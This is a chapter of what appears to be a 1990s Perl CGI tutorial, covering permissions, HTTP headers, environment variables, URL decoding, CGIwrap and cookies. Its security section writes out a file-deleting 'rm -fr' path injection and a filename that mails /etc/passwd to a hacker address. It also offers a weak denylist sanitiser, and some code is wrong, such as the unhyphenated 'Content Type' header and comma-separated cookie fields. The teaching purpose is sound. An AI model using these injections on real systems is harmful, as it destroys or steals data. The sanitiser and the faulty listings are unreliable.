# What is CGI?

CGI, or **C**ommon **G**ateway **I**nterface, is the standard programming interface between web servers and external programs. It is almost one of the most exciting and fun areas of programming today. The CGI standard lets web browsers pass information to programs written in any language. If you want to create a lightning-fast search engine, then your CGI program will most likely be written in C or C++. However, most other applications can use Perl. 

The CGI standard does not exist in isolation, it is dependent on the HTML and HTTP standards. HTML is the standard that lets web browsers understand document content. HTTP is the communications protocol that, among other things, lets web servers talk with web browser. 

```{note}
If you are unfamiliar with HTML, you might want to skip to the HTML introduction in [Form Processing](./form-processing.md) before continuing. Otherwise, take the HTML references in this chapter at face value.
```

Almost anyone can throw together some HTML and hang a "home page" out on the web. But most sites out there are, quite frankly, boring. Why? The fact is that most sites are built as a simple series of HTML documents that never change. The site is completely static. No one is likely to visit a static page more than once or twice. Think about the sites you visit most often. They probably have some interesting content, certainly, but more importantly, they have dynamic content. 

So what's a webmaster to do? No webmaster has the time to update their web site by hand every day. Fortunately, the people who developed the web protocol thought of this problem and gave us CGI. CGI gives you a way to make web sites dynamic and interactive. 

Each word in the acronym, "Common Gateway Interface," helps to understand the interface: 

* **Common** - interacts with many different operating systems. 
* **Gateway** - provides users with a way to gain access to different programs, like databases or picture generators. 
* **Interface** - uses a well-defined method to interact with a web server.

CGI applications can perform nearly any task that your imagination can think up. For example, you can create web pages on-the-fly, access databases, hold telnet sessions, generate graphics, and compile statistics. 

The basic concept behind CGI is pretty simple, however, actually creating CGI applications is not. That requires real programming skills. You need to be able to debug programs and make logical connections between one idea and another. You also need to have the ability to visualize the application that you'd like to create. This chapter and the next, [](./form-processing.md) will get you started with CGI programming. If you plan to create large applications, you might want to look at Que's "Special Edition, Using CGI".

## Why use Perl for CGI?

Perl is the de-facto standard for CGI programming for a number of reasons, but perhaps the most important are: 

* **Socket Support** - create programs that interface seamlessly with Internet protocols. Your CGI program can send a web page in response to a transaction and send a series of email messages to inform interested people that the transaction happened.
* **Pattern Matching** - ideal for handling form data and searching text.
* **Flexible Text Handling** - no details to worry. The way that Perl handles strings, in terms of memory allocation and deallocation, fades into the background as you program. You simply can ignore the details of concatenating, copying and creating new strings.

The advantage of an interpreted language in CGI applications is its simplicity in development, debugging and revision. By removing the compilation step, you and I can move more quickly from task to task, without the frustration that can sometimes arise from debugging compiled programs. Of course not any interpreted language will do. Perl has the distinct advantage of having an extremely rich and capable functionality. 

There are some times when a mature CGI application should be ported to C or another compiled language. These are the web applications where speed is important. If you expect to have a very active site, you probably want to move to a compiled language because they run faster.

## CGI Apps vs Java Applets

CGI and Java are two totally different animals. CGI is a specification that can be used by any programming language. CGI applications are run on a web server. Java is a programming language that is run on the client side. 

CGI applications should be designed to take advantage of the centralized nature of a web server. They are great for searching databases, processing HTML form data, and other applications that require limited interaction with a user. 

Java applications are good when you need a high degree of interaction with users; for example, games or animation. 

Java programs need to be kept relatively small because they are transmitted through the Internet to the client. CGI applications on the other hand can be as large as needed because they reside and are executed on the web server. 

You can design your web site to use both Java and CGI applications. For example, you might want to use Java on the client side to do field validation when collecting information on a form. Then once the input has been validated, the Java application can send the information to a CGI application on the web server where the database resides.

## Should You Use CGI Modules?

I encourage you to use the CGI modules that are available on the Internet. The most up-to-date module that I know about is called *cgi.pm* - but you must be using Perl v5.002 or an even newer version in order to use it. *cgi.pm* is very comprehensive and covers many different protocols in addition to the basic CGI standard.

You might find that *CGI.pm* is overkill for simple CGI applications. If so, look at *cgi-lite.pl*. This library doesn't do as much as *CGI.pm* but you'll probably find that it is easier to use. 

You can find both of these scripts at one of the CPAN web sites that are mentioned in ](./internet-resources.md).

However in this book, I have purposely not used these scripts. I feel it is important for you to understand the mechanisms behind the protocols. This will make debugging your applications easier because you'll have a better idea what the modules are doing behind the scenes. You will also be able to make better use of pre-existing modules if you can make educated guesses about what a poorly 
documented function does.

## How does CGI Work?

CGI programs are always placed on a disk that the web server has access to. This means that if you are using a dial-up account to maintain your web site, you need to upload your CGI programs to the server before they can be run. 

```{note}
You can test your scripts locally as long as you can use Perl on your local machine. See ](./debugging.md) section later in this chapter.
```

Web servers are generally configured so that all CGI applications are placed into a *cgi-bin* directory. However, the web server may have aliases so that "virtual directories" exist. Each user might have their own *cgi-bin* directory. The directory location is totally under the control of your web site administrator. 

```{note}
Finding out which directory your scripts need to be placed in is the first step in creating CGI programs. Since you need to get this information from your web site administrator, send an email message right now requesting this information. Also ask if there are any CGI restrictions or guidelines that you need to follow.
```

## Calling Your CGI Program

The easiest way to run a CGI program is to type in the URL of the program into your web browser. The web server should recognize that you are requesting a CGI program and execute it. For example, if you already had a CGI program called *test.pl* running on a local web server, you could start it by entering the following URL into your web browser: 

> http://localhost/cgi-bin/test.pl

The web server will execute your CGI script and any output is displayed by your web browser. 

The URL for your CGI program is a *virtual* path. The actual location of the script on the web server depends on the configuration of the server software and the type of computer being used. For example, if your computer is running the Linux operating system and the NCSA web server in a "standard" configuration 
then the above virtual would translate into */usr/local/etc/httpd/cgi-bin/test.pl*. If you were running the webSite server under Windows 95, the translated path might be */website/cgi-shl/test.pl*. 

If you have installed and are administering the web server yourself, you probably know where to place your scripts. If you are using a service provider's web server, ask the server's administrator where to put your scripts and how to reference them from your documents. 

There are other ways to invoke CGI programs besides using a web browser to visit the URL. You can also start CGI programs from: 

* a hypertext link. For Example:

```html
<A HREF="cgi-bin/test.pl">Click here to run a CGI program</A>
```

* a button on an HTML form. You can read more about HTML forms in ](./form-processing.md)

* a server-side include. You can read more about server-side includes in ](./form-processing.md)

Interestingly enough you can pass information to your CGI program by adding extra information to the standard URL. If your CGI program is used for searching your site, for example, you can pass some information to specify which directory to search. The following HTML hyperlink will invoke a search script and tell it to search the */root/document* directory. 

```html
<A HREF="cgi-bin/search.pl/root/document">Search the Document Directory</A>
```
This *extra* path information can be accessed through the *PATH_INFO* environment variable. 

You can also use a question mark to pass information to a CGI program. Typically a question mark indicates that you are passing keywords that will be used in a search. 

```html
<A HREF="cgi-bin/search.pl?Wine+1993">Search for 1993 Wines</A>
```

* The information that follows the question mark will be available to your CGI program through the QUERY_STRING environment variables. 

Using either of these approaches will let you create *canned* CGI 
requests. By creating these requests ahead of time, you can reduce the amount of typing errors that your users might otherwise have. Later in this chapter, the [](cgi-and-environment-variables) section discusses all of the environment variables you can use inside CGI programs. 

```{note}
Generally speaking, visitors to your web site should never have to type in the URL for a CGI program. A hypertext link should always be provided to start the program.
```

## Your First CGI Program

You can use any text editor or word processor in the world to create your CGI programs because they are simply Perl programs that are invoked by a URL instead of the command line. Listing 19.1 contains a five line CGI program - nearly the smallest program you can have. 

> Turn on the warning option. 
> Turn on the strict pragma. 
> Send the HTTP header to the web browser. 
> Send a line of text to the web browser.*
      
> Listing 19.1-19LST01.PL - A Very Small CGI Program

```perl
#!/usr/local/bin/perl -w
use strict;

print "Content-type: text/plain\n\n";
print "Hello, World.\n";
```

The file that contains this CGI program should be placed in your web server's *cgi-bin* directory. Then, the URL for this program will be something like *http://localhost/cgi-bin/test.pl* (change localhost to correspond to your web server's hostname). Enter this URL into your web browser and it should display a web page saying "This is a test." 

```{note}
You may wonder how the web server knows that a CGI program should be executed instead of being displayed. This is an excellent question. It can be best answered by referring to the documentation that came with your particular server.
```

When the web server executes your CGI program, it automatically opens the *STDIN*, *STDOUT*, and *STDERR* file handles for you. 

* *STDIN* - The standard input of your CGI program might contain information that was generated by an HTML form. Otherwise, you shouldn't use STDIN. 
* *STDOUT* - The standard output of your CGI program is linked to the *STDIN* of the web browser. This means you when you print information using the *print()* function, you are essentially writing   directly to the web browser's window. This link will be discussed further in   the [](http-headers) section later in this chapter.
* *STDERR* - The standard output of your CGI program is linked to the web server's log file. This is very useful when you are debugging your program. Any output from the *die()* or *warn()* function will be placed into in the server's log file. The STDERR file handle is discussed further in the [](debugging-cgi-programs) section later in this chapter.

The web server will also make some information available to your CGI program through environment variables. You may recall the %ENV hash from ](./special-variables.md). Details about the environment variables that you can use can be found in the [](cgi-and-environment-variables) section later in this chapter.

## Why Are File Permissions Important in UNIX?

File permission controls who can access files in UNIX systems. Quite often I hear of beginning CGI programmers that try to write files into a directory in which hey do not have write permission. UNIX permissions are also called *rights*. 

UNIX can control file access in a number of ways. There are three levels of permissions for three classes of users. To view the permissions on a file use the *ls* command with the *-l* command-line option. For Example: 

```text
C:indyunix:~/public_html/pfind> ls -l
total 40
-rw-r--r--   1 dbewley  staff        139 Jun 18 14:14 home.html
-rwxr-xr-x   1 dbewley  staff       9145 Aug 14 07:06 pfind
drwxr-xr--   2 dbewley  staff        512 Aug 15 07:11 tmp
```

Each line of this listing indicates a separate directory entry. The first character of the first column is normally either a dash or the letter *d*. If a directory entry has a *d* it means that the entry is a subdirectory of the current directory. 

The other nine characters are the file permissions. Permissions should be thought of in groups of three, for the three classes of user. The three classes of user are: 

* **user** - the owner of the file or directory. The owner's name is displayed in the third column of the *ls* command's output. 
* **group** - the group that owns the file. Files can have both individual owners and a group. Several users can belong to a single group. 
* **others** - any user that is not the owner or in the group that owns the file.

Each of the classes can have one or more of the following three levels of permission: 

* **r** - the class can read the file or directory. 
* **w** - the class can write to the file or directory. 
* **x** - the class can execute the file or list the directory.

If a permission is not allowed to the user that ran the *ls* command, its position is filled with a dash. For example: 

```text
ls -l hform.html
-rwx------   1 dbewley  staff      11816 May  9 09:19 slideshow.pl
```

The owner, *dbewley*, has full rights - read, write, and execute for this file. The group, staff, and everyone else have no rights. 

```{note}
Perl scripts are not compiled, they must be read by the perl interpreter each time they are run. Therefore, perl scripts unlike compiled programs must have execute *and* read permissions.
```

Here is another example: 

```text
ls -l pfind.pl
-rwxr-x---   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
```

This time, the owner has full access while the group staff can read and execute the file. All others have no rights to this file. 

Most HTML files will have permissions that look like this: 

```text
ls -l schedule.html
-rw-r--r--   1 dbewley  staff       2439 Feb  8 1996  schedule.html
```

Everyone can read it, but only the user can modify or delete it. There is no need have execute permission since HTML is not an executable language.

You can change the permissions on a file by using the *chmod* command. The *chmod* command recognizes the three classes of user as *u*, *g*, and *o* and the three levels of permissions as *r*, *w*, and *x*. It grants and revokes permissions with a *+* or *-* in conjunction with each permission that you want to change. It also will accept an *a* for all three classes of users at once. 

The syntax of the *chmod* command is: 

> chmod *options* *file*

Here are some examples of the *chmod* command in action: 

```text
ls -l pfind.pl
-rw-------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

chmod u+x pfind.pl

ls -l pfind.pl
-rwx------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
```

The first *ls* command shows you the original file permissions. Then, the *chmod* command added execute permission for the owner (or user) of *pfind.pl*. The second *ls* command displays the newly changed permissions. 

To add these permissions for the both the group and others classes use *go+rx* as in the following example. Remember, users must have at least read and execute permissions to run perl scripts. 

```text
ls -l pfind.pl
-rwx------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

chmod go+rx pfind.pl

ls -l pfind.pl
-rwxr-xr-x   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
```

Now, any user can read and execute *pfind.pl*. Let's say a serious bug was found in pfind.pl and we don't want it to be executed by anyone. To revoke execute permission for all classes of user use the *a-x* option with the *chmod* command. 

```text
ls -l pfind.pl
-rwxr-xr-x   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

chmod a-x pfind.pl

ls -l pfind.pl
-rw-r--r--   1 dbewley  staff       2863 Oct 10 1995  pfind.pl
```

Now, all users can read *pfind.pl*, but no one can execute it. 

(http-headers)=
## HTTP Headers

The first line of output for most CGI programs must be an HTTP header that tells the client web browser what type of output it is sending back via *STDOUT*. Only scripts that are called from a server-side include are exempt from this requirement. 

> Table 19.1 - A List of HTTP Headers


<TABLE cellPadding=10 border=1>
<TR>
  <TH align=left>Response Type </TH>
  <TH align=left>HTTP Header </TH></TR>
<TR>
  <TD vAlign=top>Text </TD>
  <TD vAlign=top>Content Type: text/plain</TD></TR>
<TR>
  <TD vAlign=top>HTML page </TD>
  <TD vAlign=top>Content Type: text/html</TD></TR>
<TR>
  <TD vAlign=top>gif graphic </TD>
  <TD vAlign=top>Content Type: image/gif</TD></TR>
<TR>
  <TD vAlign=top>Redirection to anther web page</TD>
  <TD vAlign=top>Location: http://www.foobar.com </TD></TR>
<TR>
  <TD vAlign=top>Cookie </TD>
  <TD vAlign=top>Set-cookie: ...</TD></TR>
<TR>
  <TD vAlign=top>Error Message </TD>
  <TD vAlign=top>Status: 402 </TD></TR>
</TABLE>

All HTTP headers must be followed by a blank line. Use the following line of code as a template: 

```text
print("Content Type: text/html\n\n");
```

Notice that the HTTP header is followed by *two* newline characters. This is very important. It ensures that a blank line will always follow the HTTP header. 

If you have installed any helper applications for Netscape or are familiar with MIME types, you already recognize the *text/plain* and *text/html* parts of the *Content Type* header. They tell the remote web browser what type of information you are sending. The two most common MIME types to use are *text/plain* and *text/html*. 

The *Location* header is used to redirect the client web browser to another web page. For example, let's say that your CGI script is designed to randomly choose from among 10 different URLs to order to determine the next web page to display. Once the new web page is choosen, your program outputs it like this: 

```
print("Location: $nextPage\n\n");
```

Once the *Location* header has been printed, nothing else should be printed. That is all the information that the client web browser needs. 

Cookies and the *Set-cookie:* header are discussed in the [](cookies) section later in this chapter. 

The last type of HTTP header is the *Status* header. This header 
should be sent when an error arises in your script that your program is not equipped to handle. I feel that this HTTP header should not be used unless you are under severe time pressure to complete a project. You should try to create your own error handling routines that display a full web page that explains the error that happened and what the user can do to fix or circumvent it. You might include the time, date, type of error, contact names and phone numbers and any other information that might be useful to the user. Relying on the standard error messages of the web server and browser will make your web site less user friendly. 

(cgi-and-environment-variables)=
## CGI and Environment Variables

You are already familiar with environment variables if you 
read ](./special-variables.md). When your CGI program is started, the web server creates and initializes a number of environment variables that your program can access using 
the *%ENV* hash.

Table 19.2 contains a short description of each environment variable. A complete description of the environmental variables used in CGI programs can be found at 

> http://www.ast.cam.ac.uk/~drtr/cgi-spec.html

<TABLE cellPadding=10 border=1>
  <CAPTION>Table 19.2 - CGI Environment Variables</CAPTION>
  <TBODY>
  <TR>
    <TH align=left>CGI Environment Variables </TH>
    <TH align=left>Description </TH></TR>
  <TR>
    <TD vAlign=top>AUTH_TYPE </TD>
    <TD vAlign=top>Optionally provides the authentication protocol used to 
      access your script if the local web server supports authentication and if 
      authentication was used to access your script.</TD></TR>
  <TR>
    <TD vAlign=top>CONTENT_LENGTH </TD>
    <TD vAlign=top>Optionally provides the length, in bytes, of the content 
      provided to the script through the *STDIN* file handle. Used 
      particularly in the *POST* method of form processing. See Chapter 
      20, "<A href="ch20.htm">Form Processing</A>," 
      for more information.</TD></TR>
  <TR>
    <TD vAlign=top>CONTENT_TYPE </TD>
    <TD vAlign=top>Optionally provides the type of content available from the 
      *STDIN* file handle. This is used for the *POST* method of 
      form processing. Most of the time this variable will be blank and you can 
      assume a value of *application/octet-stream*. </TD></TR>
  <TR>
    <TD vAlign=top>GATEWAY_INTERFACE </TD>
    <TD vAlign=top>Provides the version of CGI supported by the local web 
      server. Most of the time this will be equal to *CGI/1.1*.</TD></TR>
  <TR>
    <TD vAlign=top>HTTP_ACCEPT </TD>
    <TD vAlign=top>Provides a comma-separated list of MIME types the browser 
      software will accept. You might check this environmental variable to see 
      if the client will accept a certain kind of graphic file</TD></TR>
  <TR>
    <TD vAlign=top>HTTP_USER_AGENT </TD>
    <TD vAlign=top>Provides the type and version of the user's web browser. 
      For example, the Netscape web browser is called Mozilla.</TD></TR>
  <TR>
    <TD vAlign=top>HTTP_FROM </TD>
    <TD vAlign=top>Provides the user's email address. Not all web browsers 
      will supply this information to your server. Therefore, only use this 
      field to provide a default value for an HTML form.</TD></TR>
  <TR>
    <TD vAlign=top>QUERY_STRING </TD>
    <TD vAlign=top>Optionally contains form information when the GET method of 
      form processing is used. QUERY_STRING is also used for passing information 
      like search keywords to CGI scripts.</TD></TR>
  <TR>
    <TD vAlign=top>PATH_INFO </TD>
    <TD vAlign=top>Optionally contains any extra path information from the 
      HTTP request that invoked the script.</TD></TR>
  <TR>
    <TD vAlign=top>PATH_TRANSLATED </TD>
    <TD vAlign=top>Maps the script's virtual path (i.e. from the root of the 
      server directory) to the physical path used to call the script.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_ADDR </TD>
    <TD vAlign=top>Contains the dotted decimal address of the user.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_HOST </TD>
    <TD vAlign=top>Optionally provides the domain name for the site that the 
      user has connected from.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_IDENT </TD>
    <TD vAlign=top>Optionally provides client identification when your local 
      server has contacted an IDENTD server on a client machine. You will very 
      rarely see this because the IDENTD query is slow.</TD></TR>
  <TR>
    <TD vAlign=top>REMOTE_USER </TD>
    <TD vAlign=top>Optionally provides the name used by the user to access 
      your secured script. </TD></TR>
  <TR>
    <TD vAlign=top>REQUEST_METHOD </TD>
    <TD vAlign=top>Usually contains either "GET" or "POST" - the method by 
      which form information will be made available to your script. See Chapter 
      20, "<A href="ch20.htm">Form Processing</A>," 
      for more information.</TD></TR>
  <TR>
    <TD vAlign=top>SCRIPT_NAME </TD>
    <TD vAlign=top>Contains the virtual path to the script.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_NAME </TD>
    <TD vAlign=top>Contains the configured hostname for the server.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_PORT </TD>
    <TD vAlign=top>Contains the port number that the local web server software 
      is listening on. The standard port number is 80.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_PROTOCOL </TD>
    <TD vAlign=top>Contains the version of the web protocol this server uses. 
      For example, *HTTP/1.0*.</TD></TR>
  <TR>
    <TD vAlign=top>SERVER_SOFTWARE </TD>
    <TD vAlign=top>Contains the name and version of the web server software. 
      For example, *webSite/1.1e*.</TD></TR></TBODY></TABLE>

## URL Encoding

One of the limitations have placed on the HTTP protocol by the WWW organizations is that the content of the commands, responses, and data - passed between client and server - should be clearly defined. It is sometimes difficult to tell simply from the context whether a space character is a field delimiter or an integral part of the data - like the space in "David Medinets". 

To clear up the ambiguity, the URL encoding scheme was created. Any spaces are converted into plus (*+*) signs to avoid semantic ambiguities. In addition, special characters or 8-bit values are converted into their hexadecimal equivalents and prefaced with a percent sign (*%*). For example, the string *Davy Jones <dj@mtolive.com>* is encoded as *Davy+Jones+%3Cdj@mtolive.com%3E*. If you look closely, you see that the *<* character has been converted to *%3C* and the *>* character has been coverted to *%3E*. 

Your CGI script will need to be able to convert URL encoded information back into its normal form. Fortunately, Listing 19.2 contains a function that converts URL encoded information. 

> Define the decodeURL() function. 
> Get the encoded string from the parameter array. 
> Translate all plus signs into spaces. 
> Convert character coded as hexadecimal digits into regular characters. 
> Return the decoded string.

> Listing 19.2-19LST02.PL - How to Decode the URL Encoding

```perl
sub decodeURL {
    $_ = shift;
    tr/+/ /;
    s/%(..)/pack('c', hex($1))/eg;
    return($_);
}
```

This function will be used in ](./form-processing.md) to decode form information. It is presented here because canned queries also use URL encoding. 

## Security

CGI really has only one large security hole that I can see. If you pass information that came from a remote site to an operating system command, you are asking for trouble. I think an example is needed to understand the problem because it is not obvious.

Suppose that you had a CGI script that formatted a directory listing and generated a web page that let visitors view the listing. In addition, let's say that the name of the directory to display was passed to your program using the *PATH_INFO* environment variable. The following URL could be used to call your program: 

```text
http://www.foo.com/cgi-bin/dirlist.pl/docs
```

Inside your program, the *PATH_INFO* environment variable is set to *docs*. In order to get the directory listing, all that is needed is a call to the *ls* command in UNIX or the *dir* command in DOS. Everything looks good right? 

But what if the program was invoked with this command line? 

```text
http://www.foo.com/cgi-bin/dirlist.pl/; rm -fr;
```

Now, all of a sudden, you are faced with the possibility of files being deleted because the semi-colon (;) lets multiple commands be executed on one command line. 

This same type of security hole is possible any time you try to run an external command. You might be tempted to use the *mail*, *sendmail*, or *grep* commands to save time while writing your CGI program, but since all of these programs are easily duplicated using Perl try to resist the temptation. 

Another security hole is related to using external data to open or create files. Some enterprising hacker could use *"| mail hacker@hacker.com < /etc/passwd"* as the filename to mail your password file or any other file to himself. 

All of these security holes can be avoided by removing the dangerous characters (like the *|* or pipe character). 

> Define the improveSecurity() function. 
> Copy the passed string into $_, the default search space. 
> Protect against command-line options by removing - and + characters. 
> Additional protection against command-line options. 
> Convert all dangerous characters into harmless underscores. 
> Return the $_ variable.

> Listing 19.3-19LST03.PL - How to Remove Dangerous Characters

```perl
sub improveSecurity {
    $_ = shift;
    s/\-+(.*)/\1/g;
    s/(.*)[ \t]+\-(.*)/$1$2/g;
    tr/\$\'\`\"\<\>\/\;\!\|/_/;
    return($_);
}
```

## CGIwrap and Security

CGIwrap (**<A href="http://wwwcgi.umr.edu/~cgiwrap/">http://wwwcgi.umr.edu/~cgiwrap/</A>**) is a UNIX based utility written by Nathan Neulinger which lets general users run CGI scripts without needing access to the server's *cgi-bin* directory. Normally all scripts must be located in the server's main *cgi-bin* directory and all run with the same UID (user id) as the web server. CGIwrap performs various security checks on the scripts before changing id to match the owner of the script. All scripts are executed with same the user id as the user who owns them. CGIwrap works with NCSA, Apache, CERN, Netsite, and probably any other UNIX web server. 

Any files created by a CGI program are normally owned by the web server. This can cause a problem if you need to edit or remove files created by CGI programs. You might have to ask the system administrator for help because you lack the proper authorization. All CGI programs have the same system permissions as the web server. If you run your web server under the root user id - being either very brave or very foolish - a CGI program could be tricked into erasing the entire hard drive. CGIwrap provides a way around these problems. 

With CGIwrap, scripts are located in users' *public_html/cgi-bin* directory and run under their user id. This means that any files the CGI program creates are owned by the same user. Damage caused by any security bugs you may have introduced - via the CGI program - will be limited to your own set of directories. 

In addition to this security advantage, CGIwrap is also an excellent debugging tool. When CGIwrap is installed it is copied to cgiwrapd which can be used to view output of failing CGIs. 

You can install CGIwrap by following these steps. 

* Obtain the source from the <A 
href="http://www.umr.edu/~cgiwrap/download.html">http://www.umr.edu/~cgiwrap/download.html</A> web page. 
* Ensure that you have root access. 
* Unpack and run the Configure script. 
* Type **make**. 
* With a user id of root, copy the *cgiwrap* executable to your 
server's *cgi-bin* directory. 
* Make sure that *cgiwrap* is owned by root and executable by all 
users by typing **chown root cgiwrap; chmod 4755 cgiwrap**. The 
*cgiwrap* executable must also be setuid. 
* In order to gain the debugging advantages of CGIwrap, create symbolic links to *cgiwrap* called *cgiwrapd*, *nph-cgiwrap*, and 
*nph-cgiwrapd*. The first symbolic link can be created by typing **ln -s cgiwrap cgiwrapd**. The others are created using similar 
commands.

```{note}
You can find additional information at the <A 
href="http://www.umr.edu/~cgiwrap/install.html">http://www.umr.edu/~cgiwrap/install.html</A> web site.
```

CGIs that run using CGIwrap are stored in a *cgi-bin* directory under an individual user's public web directory and called like this:

```text
http://servername/cgi-bin/cgiwrap/~userid/scriptname
```

To debug a script run via cgiwrap add the letter "d" to *cgiwrap*: 

```text
http://servername/cgi-bin/cgiwrapd/~userid/scriptname
```

When you use CGIwrap to debug your CGI programs, quite a lot of information will be displayed in the web brower's window. For example, if you called a CGI program with the following URL: 

```text
http://www.engr.iupui.edu/cgi-bin/cgiwrapd/~dbewley/cookie-test.pl
```

The output might look like this: 

```
Redirecting STDERR to STDOUT
Setting Limits (CPU)
Environment Variables:
   QUERY_STRING: ''
   PATH_INFO: '/~dbewley/cookie-test.pl'
   REMOTE_HOST: 'x2s5p10.dialin.iupui.edu'
   REMOTE_ADDR: '134.68.249.69'
   SCRIPT_NAME: '/cgi-bin/cgiwrapd'
Trying to extract user/script from PATH_INFO
Extracted Data:
   User:  'dbewley'
   Script:  'cookie-test.pl'
Stripping user and script data from PATH_INFO env. var.
Adding user and script to SCRIPT_NAME env. var.
Modified Environment Variables:
   PATH_INFO: ''
   SCRIPT_NAME: '/cgi-bin/cgiwrapd/dbewley/cookie-test.pl'
Sanitize user name: 'dbewley'-'dbewley'
Sanitize script name: 'cookie-test.pl'-'cookie-test.pl'
Log Request
   Opening log file.
   Writing log entry.
   Closing log file.
   Done logging request.
User Data Retrieved:
   UserName: 'dbewley'
   UID: '8670'
   GID: '200'
   Directory: '/home/stu/d/dbewley'
UIDs/GIDs Changed To:
   RUID: '8670'
   EUID: '8670'
   RGID: '200'
   EGID: '200'
Current Directory:  '/sparcus/users/dbewley/www/cgi-bin'
Results of stat:
   File Owner: '8670'
   File Group: '200'
   Exec String:  './cookie-test.pl'
Output of script follows:
=====================================================
Set-Cookie: user=dbewley; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; domain=.engr.iupui.edu;
Set-Cookie: flag=black; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; domain=.iupui.edu;
Set-Cookie: car=honda:accord:88:LXI:green; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; domain=.engr.iupui.edu;
Content-type: text/html
Cookies:
flag = black
car = honda:accord:88:LXI:green
user = dbewley
```

This output can be invaluable if your script is dying because of a syntax error before it can print an HTTP header to the browser. 

```{note}
If you'd like a more in-depth description of CGI Security visit this web sites: <A href="http://www.umr.edu/~cgiwrap/">http://www.umr.edu/~cgiwrap/</A>
```

(cookies)=
## Cookies

Most webmasters want to track the progress of a user from page to page as they click about the site. Unfortunately, HTTP is a *stateless* protocol. Stateless protocols have no memory, they only understand the current command. This makes tracking a visitor through a site difficult at best. A user could visit a site leave and come back a day or a minute later, possibly from a different IP address and the site maintainer has no way of knowing if this is the same browser or not. 

One answer to this dilemma is to use *cookies* in your CGI programs. Cookies can provide a way to maintain information from one HTTP request to the next - remember the concept of persistent information? 

A cookie is a small chunk of data, stored on the visitor's local hard drive by the web sever. It can be used to track your path through a web site and develop a visitor's profile for marketing or informational purposes. Cookies can also be used to hold information like account numbers and purchase decisions so that shopping applications can be created.

## Cookie Security

There has been some controversy about whether cookies are secure. Although the cookie mechanism provides a way for a web server to write data to your hard disk the limitations are very strict. A client may only hold a maximum of 300 cookies at a time and a single server may only give 20 cookies to it. Cookies can only be 4 kilobytes each, including the name and data, so at most a visitor's hard disk may have 1.2 megabytes of hard disk being used to store cookies. In addition, cookie data may only be written to one file, usually called *cookies.txt*. 

During a browsing session Netscape stores cookies in memory, but when the browser is exited cookies are written into a file called *cookies.txt*. On the Macintosh the cookie jar is in a file called *MagicCookie* in the preferences folder. The cookie file contains plain text as shown in Listing 19.3.

## How Are Cookies Created And Read?

Cookies are set using a *Set-cookie:* HTTP header with 5 
possible fields separated with a semicolon and a space. These fields are: 

* **cookie-name=cookie-value;** - name of the cookie and its value. The name and the value combined must be less than 4 kilobytes in length. 
* **expires=expiration-date;** - the date the cookie will be deleted from the cookie file. You can delete a previously set cookie ahead of schedule, by creating a second cookie with the same name, path, and domain, but with an expiration date in the past. 
* **path=cookie-path;** - Combines with the domain name to determine when a browser should show a cookie to the server. 
* **domain=server-domain;** - Used to determine when a browser should show a cookie to the server. Usually, cookies are created with the web server's name without the *www*. For example, *.foo.net* instead of *www.foo.net*. Notice that the leading period is retained. 
* **secure** - ensures that the cookie will only be sent back to the server when a secure HTTP connection has been established.

When all of these elements are put together they look like this: 

```
Set-Cookie: user_addr=ppp1.dialin.iupui.edu; [iccc]
    expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/; [iccc]
    domain=.engr.iupui.edu; secure
```

Listing 19.4 contains a program that both sets and read cookies. First, it will create four cookies and then it will read those cookies from the *HTTP_COOKIE* environment variable. Inside the HTTP_COOKIE environment variable, the cookies are delimited by a semi-colon and a space. The cookie fields are separated by commas, and the name-value pairs are separated by equal signs. In order to use cookies, you need to parse the HTTP_COOKIE variable at three different levels. 

> Turn on the warning option. 
> Turn on the strict pragma. 
> Declare a variable to hold the expiration date and time of the cookies. 
> Declare a variable to hold the domain name. 
> Declare a variable to hold the path name. 
> Set four cookies with different values. 
> Read those four cookies from the environment place them into %cookies. 
> Start the HTML web page. 
> Display a text heading on the web page. 
> Start an HTML table. 
> Display each cookie in a table row. 
> End the table. 
> End the web page. 
> Define the setCookie() function. 
> Create local variables from the parameter array. 
> Send the Set-Cookie: HTTP header to the web browser. 
> Send the secure option only if requested. 
> End the header with a newline. 
> Define the getCookies() function. 
> Create a local hash to hold the cookies. 
> Iterate over an array created by splitting the HTTP_COOKIE environment variable based on the "; " character sequence. 
> Split off the name of the cookie. 
> Create a hash entry with the cookie's name as the key and the rest of the cookie as the entry's value. 
> Return the hash.

> Listing 19.4-19LST04.PL - How to Set and Retrieve Cookies

```perl
#!/usr/local/bin/perl -w
use strict;

my($expDate)   = "Wednesday, 09-Nov-99 00:00:00 GMT";
my($theDomain) = ".engr.iupui.edu";
my($path)      = "/cgi-bin/";

setCookie("user", "dbewley", $expDate, $path, $theDomain);

setCookie("user_addr", $ENV{'REMOTE_HOST'}, $expDate, $path, $theDomain)
    if defined($ENV{'REMOTE_HOST'});

setCookie("flag", "black", $expDate, $path, ".iupui.edu");
setCookie("car", "honda:accord:88:LXI:green", $expDate, $path, $theDomain);

my(%cookies) = getCookies();

print("Content-type: text/html\n\n");
print("<HTML>");
print("<HEAD><TITLE>The Cookie Display</TITLE></HEAD>");
print("<BODY>");
print("<H1>Cookies</H1>");
print("<TABLE BORDER=1 CELLPADDING=10>");
foreach (sort(keys(%cookies))) {
    print("<TR><TD>$_</TD><TD>$cookies{$_}</TD></TR>");
}
print("</TABLE>");
print("</BODY>");
print("</HTML>");

sub setCookie {
    my($name, $val, $exp, $path, $dom, $secure) = @_;

    print("Set-Cookie: ");
    print("$name=$val, expires=$exp, path=$path, domain=$dom");
    print(", $secure") if defined($secure);
    print("\n");
}

sub getCookies {
    my(%cookies);

    foreach (split (/; /,$ENV{'HTTP_COOKIE'})){
        my($key) = split(/=/, $_);

        $cookies{$key} = substr($_, index($_, "=")+1);
    }
    return(%cookies);
}
```

